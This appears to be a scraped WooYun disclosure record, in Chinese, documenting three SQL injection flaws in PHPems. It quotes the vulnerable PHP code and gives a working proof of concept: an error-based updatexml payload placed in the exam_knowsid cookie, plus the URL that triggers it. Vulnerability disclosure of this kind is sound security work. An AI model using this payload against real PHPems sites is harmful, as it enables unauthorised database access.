{"id": 36850, "wybug_id": "wooyun-2015-0100988", "wybug_title": "phpems某处设计失误导致3枚SQL注入漏洞", "wybug_corp": "phpems", "wybug_author": "路人甲", "wybug_date": "2015-03-12 18:48", "wybug_open_date": "2015-04-30 18:48", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-12：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-04-30：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： phpems某处设计失误导致3枚SQL注入漏洞 详细说明：  4. PHPems再来3枚SQL注入漏洞吧存在漏洞代码位置在/app/exam/app.php的lesson()函数中public function lesson()\t{\t\t$action = $this->ev->url(3);\t\t$page = $this->ev->get('page');\t\tswitch($action)\t\t{\t\t\tcase 'ajax':\t\t\tswitch($this->ev->url(4))\t\t\t{\t\t\t\tcase 'questions':\t\t\t\t$number = $this->ev->get('number');\t\t\t\tif(!$number)$number = 1;\t\t\t\t$questid = $this->ev->getCookie('questype');\t\t\t\t$knowsid = $this->ev->getCookie('knowsid');\t\t\t\t$questions = $this->question->getRandQuestionListByKnowid($knowsid,$questid);//存在注入漏洞\t\t\t\t$allnumber = $this->exam->getQuestionNumberByQuestypeAndKnowsid($questid,$knowsid);//存在注入漏洞OK!phpems机制我就不想说了，$knowsid = $this->ev->getCookie('knowsid');的意思就是说knowsid可以人为在cookie中指定接下来进入函数getRandQuestionListByKnowid($knowsid,$questid)【1】function getRandQuestionListByKnowid($knowid,$typeid)\t{\t\t$data = array('DISTINCT questions.questionid',array('questions','quest2knows'),array(\"quest2knows.qkknowsid IN ({$knowid})\",\"quest2knows.qktype = 0\",\"quest2knows.qkquestionid = questions.questionid\",\"questions.questiontype = '{$typeid}'\",\"questions.questionstatus = 1\"),false,false,false);\t\t$sql = makeSelect($data); \t\treturn $sql;\t}可以看到对$knowid没有进行任何过滤操作，单引号没加Makeselect函数只是拼接参数用，所以就构成了SQL注入漏洞下面的那个函数getQuestionNumberByQuestypeAndKnowsid（）【2】存在注入的原因是一模一样的，public function getQuestionNumberByQuestypeAndKnowsid($questype,$knowsid)\t{\t\tif(!$knowsid)$knowsid = '0';\t\t$data = array(\"count(*) AS number\",array('questions','quest2knows'),array(\"questions.questiontype = '{$questype}'\",\"questions.questionparent = 0\",\"questions.questionstatus = 1\",\"questions.questionid = quest2knows.qkquestionid\",\"quest2knows.qkknowsid IN ({$knowsid})\",\"quest2knows.qktype = 0\"),false,false,false);\t\t$sql = $this->sql->makeSelect($data);\t\t$r = $this->db->fetch($sql);\t\t$data = array(\"sum(qrnumber) AS number\",array('questionrows','quest2knows'),array(\"questionrows.qrtype = '{$questype}'\",\"questionrows.qrstatus = 1\",\"questionrows.qrid = quest2knows.qkquestionid\",\"quest2knows.qkknowsid IN ({$knowsid})\",\"quest2knows.qktype = 1\"),false,false,false);\t\t$sql = $this->sql->makeSelect($data);\t\t$m = $this->db->fetch($sql);\t\treturn $r['number']+$m['number'];\t}而且里面还有两处没过滤的地方都能引发注入漏洞接下来的函数getRandQuestionRowsListByKnowid（）存在相同的问题【3】我验证第一处，后面都是一样的首先注册用户登录之，然后在cookie中加入exam_knowsid变量，值设置成(updatexml(1,concat(0x5e24,(select user()),0x5e24),1))\n\n然后访问localhost/ems/index.php?exam-app-lesson-ajax-questions\n\nOK，验证通过。   漏洞证明：  我验证第一处，后面都是一样的首先注册用户登录之，然后在cookie中加入exam_knowsid变量，值设置成(updatexml(1,concat(0x5e24,(select user()),0x5e24),1))\n\n然后访问localhost/ems/index.php?exam-app-lesson-ajax-questions\n\nOK，验证通过。   修复方案：  把参数过滤全，最好深入到底层修补   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}